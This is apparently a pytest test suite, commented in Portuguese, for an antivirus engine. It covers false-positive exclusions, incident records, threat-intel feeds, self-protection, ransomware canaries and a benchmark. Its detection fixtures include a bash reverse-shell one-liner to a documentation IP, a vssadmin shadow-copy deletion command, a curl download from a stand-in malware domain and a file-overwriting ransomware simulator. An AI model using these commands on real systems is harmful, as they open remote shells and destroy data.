"""Testes: falsos positivos, centro de incidentes, inteligência de ameaças, autoproteção, iscas e benchmark."""
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import time

import pytest

from exeav import canary, config, fpengine, history, incidents, intel, paths, selfprotect
from exeav.engine.engine import Engine
from exeav.engine.models import MALICIOUS, SUSPICIOUS
from samples import eicar

LINUX = sys.platform.startswith("linux")
REVERSE = b"#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n"


@pytest.fixture()
def eng():
    return Engine(config.Settings())


# =========================================================================== confiança multi-sinal
def test_confidence_levels(eng, tmp_path):
    e = tmp_path / "e.bin"
    e.write_bytes(eicar())
    assert eng.scan_file(str(e)).result.confidence == "confirmada"
    r = eng.analyze(b"vssadmin delete shadows /all /quiet", ftype="script").result
    assert r.verdict == SUSPICIOUS and r.confidence in ("baixa", "média")
    assert eng.analyze(b"echo ola", ftype="script").result.confidence == ""
    assert "confidence" in r.to_dict()


# =========================================================================== falsos positivos
def test_false_positive_is_specific_auditable_and_reversible(eng, tmp_path):
    f = tmp_path / "ferramenta.sh"
    f.write_bytes(REVERSE)
    r = eng.scan_file(str(f)).result
    assert r.verdict == MALICIOUS
    fid = fpengine.mark(r, "ferramenta de laboratório da empresa, revisada", scope="arquivo")
    r2 = eng.scan_file(str(f)).result
    assert r2.verdict == "limpo" and any(i.id == "fp.user" for i in r2.indicators)
    # outro arquivo com conteúdo diferente NÃO herda a exclusão (não é por pasta/caminho)
    g = tmp_path / "ferramenta2.sh"
    g.write_bytes(REVERSE + b"# alterado\n")
    assert eng.scan_file(str(g)).result.verdict == MALICIOUS
    # o próprio arquivo, se mudar, perde a exclusão
    f.write_bytes(REVERSE + b"\n")
    assert eng.scan_file(str(f)).result.verdict == MALICIOUS
    d = next(x for x in fpengine.decisions() if x["id"] == fid)
    assert d["justification"].startswith("ferramenta") and "nix.reverse_shell" in d["rules"] and d["active"]
    assert ("nix.reverse_shell", 1) in fpengine.rule_stats()
    fpengine.revoke(fid, "teste")
    assert not next(x for x in fpengine.decisions() if x["id"] == fid)["active"]
    f.write_bytes(REVERSE)
    assert eng.scan_file(str(f)).result.verdict == MALICIOUS


def test_rule_scoped_exclusion_keeps_other_evidence(eng, tmp_path):
    f = tmp_path / "x.sh"
    f.write_bytes(REVERSE)
    r = eng.scan_file(str(f)).result
    fid = fpengine.mark(r, "regra não se aplica aqui", scope="regras")
    try:
        r2 = eng.scan_file(str(f)).result
        assert not any(i.id == "nix.reverse_shell" for i in r2.indicators)
    finally:
        fpengine.revoke(fid)


def test_known_malware_cannot_be_excluded(eng, tmp_path):
    e = tmp_path / "e.com"
    e.write_bytes(eicar())
    with pytest.raises(PermissionError):
        fpengine.mark(eng.scan_file(str(e)).result, "teste")
    with pytest.raises(ValueError):
        fpengine.mark(eng.analyze(REVERSE, ftype="script").result, "   ")


# =========================================================================== incidentes (zero-day center)
def test_incident_has_evidence_and_is_deduplicated(eng, tmp_path):
    f = tmp_path / "desconhecido.sh"
    f.write_bytes(REVERSE)
    r = eng.scan_file(str(f)).result
    seen = []
    incidents.add_listener(lambda inc, new: seen.append(new))
    inc_id, new = incidents.report(r, "teste", pid=os.getpid(), action="notificado")
    assert new and inc_id.startswith("INC-")
    inc = incidents.get(inc_id)
    assert set(inc["hashes"]) == {"sha256", "sha512", "sha3_256"} and inc["hashes"]["sha256"] == r.sha256
    assert inc["desconhecida"] and inc["status"] == "em investigação"
    assert inc["classificacao"] in ("alto risco", "crítico") and inc["confianca"]
    assert "nix.reverse_shell" in inc["regras_acionadas"] and inc["processo"]["pid"] == os.getpid()
    assert inc["evidencia"]["onde"] == "evidências"                  # cópia neutralizada guardada
    assert "zero-day" in inc["resultado_da_analise"] and "não confirma" in inc["resultado_da_analise"]
    # mesma ameaça de novo: soma ocorrência, sem alerta novo
    inc_id2, new2 = incidents.report(r, "teste", action="de novo")
    assert inc_id2 == inc_id and not new2 and incidents.get(inc_id)["ocorrencias"] == 2
    assert seen[-2:] == [True, False]
    assert incidents.search("desconhecido.sh")[0]["id"] == inc_id
    assert incidents.search(unknown_only=True, classification=inc["classificacao"])
    html = incidents.export_html([incidents.get(inc_id)])
    assert inc_id in html and "não é confirmação de zero-day" in html
    assert json.loads(incidents.export_json(inc))["id"] == inc_id


def test_known_threat_is_not_unknown(eng, tmp_path):
    e = tmp_path / "e2.com"
    e.write_bytes(eicar())
    r = eng.scan_file(str(e)).result
    inc = incidents.get(incidents.report(r, "teste")[0])
    assert not inc["desconhecida"] and inc["status"] == "ameaça confirmada" and inc["classificacao"] == "crítico"


def test_incident_review_false_positive_creates_specific_exclusion(eng, tmp_path):
    f = tmp_path / "admin.sh"
    f.write_bytes(REVERSE + b"# script do administrador\n")
    r = eng.scan_file(str(f)).result
    inc_id, _ = incidents.report(r, "teste")
    inc = incidents.mark_false_positive(inc_id, "script de laboratório autorizado")
    assert inc["status"] == "falso positivo" and inc["revisao"][-1]["nota"].startswith("script")
    assert eng.scan_file(str(f)).result.verdict == "limpo"
    assert any(d["sha256"] == r.sha256 for d in fpengine.decisions(include_revoked=False))


def test_behavior_incident(tmp_path):
    inc_id, new = incidents.report(None, "anti-botnet", behavior={
        "title": "Botnet: teste", "verdict": "malicioso", "score": 120, "critical": True, "key": "x",
        "indicators": [{"id": "botnet.beacon", "name": "beacon", "category": "Rede", "weight": 50},
                       {"id": "botnet.temp_exe", "name": "tmp", "category": "Processo", "weight": 20}]})
    inc = incidents.get(inc_id)
    assert new and inc["classificacao"] == "crítico" and inc["tipos_de_evidencia"] == ["Processo", "Rede"]


# =========================================================================== inteligência de ameaças
def _tf(*rows):
    head = b'# "first_seen_utc","ioc_id","ioc_value","ioc_type"\n'
    return head + b"".join(f'"2026-11-01 10:00:00", "{i}", "{v}", "{k}", "x", "y", "", "Z", "", "100"\n'.encode()
                           for i, (v, k) in enumerate(rows))


def test_intel_feed_validation_dedupe_versioning(eng, tmp_path):
    rows = [("1.2.3.4:443", "ip:port"), ("malware-cdn.example", "domain"), ("http://evil-dl.example/a", "url"),
            ("b" * 64, "sha256_hash"), ("5.6.7.8:80", "ip:port"), ("192.168.0.9:80", "ip:port"),
            ("www.microsoft.com", "domain")]
    r1 = intel.ingest("threatfox", _tf(*rows), "teste")
    assert r1["resultado"] == "ok" and r1["novos"] == 5
    assert "192.168.0.9" not in intel.ips()                    # rede local nunca é bloqueada
    assert not intel.is_malicious_domain("www.microsoft.com")   # domínio essencial descartado
    assert intel.is_malicious_domain("a.b.malware-cdn.example")
    r2 = intel.ingest("threatfox", _tf(*rows), "teste")
    assert r2["versao"] == r1["versao"] + 1 and r2["novos"] == 0   # deduplicado
    assert intel.update_history()[0]["versao"] == r2["versao"]
    # o motor usa a inteligência: conteúdo citando domínio malicioso + hash conhecido
    res = eng.analyze(b"curl -o x http://cdn.malware-cdn.example/p.sh", ftype="script").result
    assert any(i.id == "intel.malicious_host" for i in res.indicators)
    f = tmp_path / "h.bin"
    f.write_bytes(b"conteudo qualquer")
    import hashlib
    intel.ingest("threatfox", _tf(*(rows + [(hashlib.sha256(b"conteudo qualquer").hexdigest(), "sha256_hash")])), "t")
    assert eng.scan_file(str(f)).result.verdict == MALICIOUS


def test_intel_rejects_corrupt_feeds_and_keeps_previous_version():
    intel.ingest("feodo", b"# lista\n1.2.3.4\n5.6.7.8\n", "t")
    before = set(intel.ips())
    for bad in (b"<html>503 Service Unavailable</html>", b"", b"lixo\n" * 50 + b"9.9.9.9\n"):
        with pytest.raises(ValueError):
            intel.ingest("feodo", bad, "t")
    assert set(intel.ips()) == before


def test_intel_detects_tampered_local_file():
    intel.ingest("urlhaus", b"".join(f"127.0.0.1 malware{i}.example\n".encode() for i in range(30)), "t")
    p = paths.data_dir() / "intel" / "urlhaus.json"
    d = json.loads(p.read_text())
    d["entries"]["domain"]["google.com"] = time.time()
    p.write_text(json.dumps(d))
    intel._invalidate()
    st = {s["id"]: s for s in intel.status()}
    assert st["urlhaus"]["corrompido"] and not intel.is_malicious_domain("google.com")


def test_intel_expiry(monkeypatch):
    intel.ingest("feodo", b"4.4.4.1\n", "t")
    real = time.time
    monkeypatch.setattr(intel.time, "time", lambda: real() + 40 * 86400)
    r = intel.ingest("feodo", b"4.4.4.2\n", "t")
    assert r["expirados"] >= 1 and "4.4.4.1" not in intel.ips() and "4.4.4.2" in intel.ips()


# =========================================================================== autoproteção
def test_history_chain_detects_tampering():
    history.log("teste", "evento 1")
    history.log("teste", "evento 2")
    history.log("teste", "evento 3")
    assert history.verify()["ok"]
    db = paths.data_dir() / "history.db"
    c = sqlite3.connect(str(db))
    rid = c.execute("SELECT id FROM events WHERE message='evento 2' ORDER BY id DESC LIMIT 1").fetchone()[0]
    c.execute("UPDATE events SET message='nada aconteceu' WHERE id=?", (rid,))
    c.commit()
    v = history.verify()
    assert not v["ok"] and "alterado" in v["problema"]
    c.execute("UPDATE events SET message='evento 2' WHERE id=?", (rid,))
    c.execute("DELETE FROM events WHERE id=?", (rid,))
    c.commit()
    c.close()
    assert not history.verify()["ok"]
    history.clear()                      # limpeza legítima reinicia a corrente
    history.log("teste", "depois da limpeza")
    assert history.verify()["ok"]


def test_config_tampering_detected_and_restored():
    st = config.store()
    st.settings.realtime_enabled = True
    st.save()
    assert selfprotect.check_config()["ok"] is True
    d = json.loads(st.path.read_text("utf-8"))
    d["realtime_enabled"] = False                       # "malware" desliga a proteção editando o arquivo
    st.path.write_text(json.dumps(d), "utf-8")
    chk = selfprotect.check_config()
    assert chk["ok"] is False and "realtime_enabled" in chk["protecoes"]
    selfprotect.restore_config()
    assert config.store().settings.realtime_enabled is True and selfprotect.check_config()["ok"] is True


def test_program_integrity_manifest(tmp_path):
    root = tmp_path / "app"
    (root / "lib").mkdir(parents=True)
    (root / "ExeAntivirus").write_bytes(b"\x7fELF programa")
    (root / "lib" / "a.so").write_bytes(b"biblioteca")
    (root / selfprotect.MANIFEST).write_text(json.dumps(selfprotect.build_manifest(root)))
    assert selfprotect.check_program_files(root)["ok"] is True
    (root / "lib" / "a.so").write_bytes(b"biblioteca adulterada")
    (root / "lib" / "injetada.dll").write_bytes(b"MZ")
    chk = selfprotect.check_program_files(root)
    assert chk["ok"] is False and chk["alterados"] == ["lib/a.so"] and "lib/injetada.dll" in chk["estranhos"]


def test_selfprotect_run_all_reports_every_check():
    names = {c["nome"] for c in selfprotect.run_all()}
    assert {"Arquivos do programa", "Regras de detecção", "Configurações", "Histórico (log encadeado)",
            "Quarentena"} <= names


# =========================================================================== iscas anti-ransomware
def test_canaries_created_and_tripped(tmp_path):
    docs = tmp_path / "Documentos"
    docs.mkdir()
    active = canary.ensure([str(docs)])
    assert len(active) == 2 and all(os.path.isfile(p) for p in active)
    p = next(x for x in active if x.endswith(".txt"))
    assert not canary.tripped(p, "modificado")                 # intacta
    with open(p, "r+b") as f:                                   # "cifrada" no lugar (como o ransomware faz)
        f.write(os.urandom(200))
    assert canary.tripped(p, "modificado")
    assert canary.tripped(p, "renomeado")
    assert not canary.tripped(p, "apagado")                     # apagar sozinho não dispara bloqueio
    canary.ensure([str(docs)])
    assert not canary.tripped(p, "modificado")                  # recriada
    assert canary.remove_all() >= 2 and not os.listdir(docs)   # remove estas e as de outros testes


@pytest.mark.skipif(not LINUX, reason="simulação de ataque com processo no Linux")
def test_canary_attack_suspends_ransomware_process(tmp_path, eng):
    """Simulador INOFENSIVO: reescreve com bytes aleatórios só arquivos que ele mesmo criou + a isca."""
    from exeav.quarantine import Quarantine
    from exeav.realtime import RealtimeProtection
    home = tmp_path / "home"
    docs = home / "Documentos"
    docs.mkdir(parents=True)
    for i in range(5):
        (docs / f"relatorio{i}.txt").write_text("texto importante " * 200)
    s = config.Settings()
    s.realtime_dirs = [str(docs)]
    s.realtime_process_monitor = False
    e = Engine(s)
    events = []
    rt = RealtimeProtection(e, Quarantine(tmp_path / "q"), lambda k, d: events.append((k, d)))
    old_home = os.environ.get("HOME")
    os.environ["HOME"] = str(home)
    try:
        rt.start()
        time.sleep(1.5)
        assert len(rt.canaries) == 2
        sim = tmp_path / "simulador.py"
        sim.write_text("import os,sys,time\nd=sys.argv[1]\n"
                       "for n in sorted(os.listdir(d)):\n p=os.path.join(d,n)\n"
                       " if os.path.isfile(p):\n  open(p,'wb').write(os.urandom(4096))\n  time.sleep(0.05)\n"
                       "time.sleep(30)\n")
        p = subprocess.Popen([sys.executable, str(sim), str(docs)])
        t = time.time()
        while time.time() - t < 15 and not any(k == "ransomware" for k, _ in events):
            time.sleep(0.2)
        import psutil
        status = psutil.Process(p.pid).status()
    finally:
        rt.stop()
        if old_home is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = old_home
        try:
            import psutil
            psutil.Process(p.pid).resume()
        except Exception:
            pass
        p.kill()
    info = next(d for k, d in events if k == "ransomware")
    assert info.get("canary") and info["process"]["pid"] == p.pid
    assert info.get("suspended") and status == "stopped"


# =========================================================================== tempo real: cadeia de execução
@pytest.mark.skipif(not LINUX, reason="Linux")
def test_destructive_system_command_from_unknown_program(tmp_path, eng):
    """Um 'programa desconhecido' chama uma ferramenta do sistema com comando destrutivo: o comando é
    analisado (mesmo sem interpretador), a cadeia vira segundo sinal e o programa-pai é suspenso."""
    from exeav.quarantine import Quarantine
    from exeav.realtime import RealtimeProtection
    bindir = tmp_path / "bin"
    bindir.mkdir()
    bash = open(shutil.which("bash"), "rb").read()
    tool = bindir / "vssadmin"                # ferramenta "do sistema" falsa e inofensiva (cópia do bash)
    tool.write_bytes(bash)
    tool.chmod(0o755)
    parent = tmp_path / "atualizador"         # programa desconhecido (sem pacote/assinatura)
    parent.write_bytes(bash)
    parent.chmod(0o755)
    s = config.Settings()
    s.realtime_dirs = []
    e = Engine(s)
    events = []
    rt = RealtimeProtection(e, Quarantine(tmp_path / "q"), lambda k, d: events.append((k, d)))
    rt.start()
    time.sleep(2)
    inner = f"{tool} -c 'sleep 30; true' 'vssadmin delete shadows /all /quiet' & sleep 30; true"
    p = subprocess.Popen([str(parent), "-c", inner], start_new_session=True)
    try:
        t = time.time()
        while time.time() - t < 15 and not any(k == "threat" and "chain.untrusted_parent" in
                                               {i.id for i in d.indicators} for k, d in events):
            time.sleep(0.3)
    finally:
        rt.stop()
        import signal

        import psutil
        try:
            psutil.Process(p.pid).resume()
        except Exception:
            pass
        os.killpg(p.pid, signal.SIGCONT)
        os.killpg(p.pid, signal.SIGKILL)
    hits = [d for k, d in events if k == "threat"]
    assert hits, "comando destrutivo não foi analisado"
    chained = [d for d in hits if "chain.untrusted_parent" in {i.id for i in d.indicators}]
    assert chained and chained[0].verdict == MALICIOUS and "suspenso" in chained[0].action


# =========================================================================== benchmark reproduzível
def test_benchmark_runs_and_reports_honest_metrics(tmp_path):
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools"))
    import benchmark
    r = benchmark.run(benign_n=120, out_dir=str(tmp_path), quiet=True)
    m = r["metricas"]
    assert r["conjunto"]["ameacas"] > 50 and r["conjunto"]["legitimos"] >= 100
    assert m["recall"] >= 0.95 and m["taxa_falsos_positivos"] <= 0.01
    assert 0 <= m["precisao"] <= 1 and 0 <= m["f1"] <= 1
    assert r["limitacoes"] and "NÃO são comparáveis" in " ".join(r["limitacoes"])
    assert (tmp_path / "benchmark.json").exists() and "Limitações" in (tmp_path / "benchmark.html").read_text("utf-8")
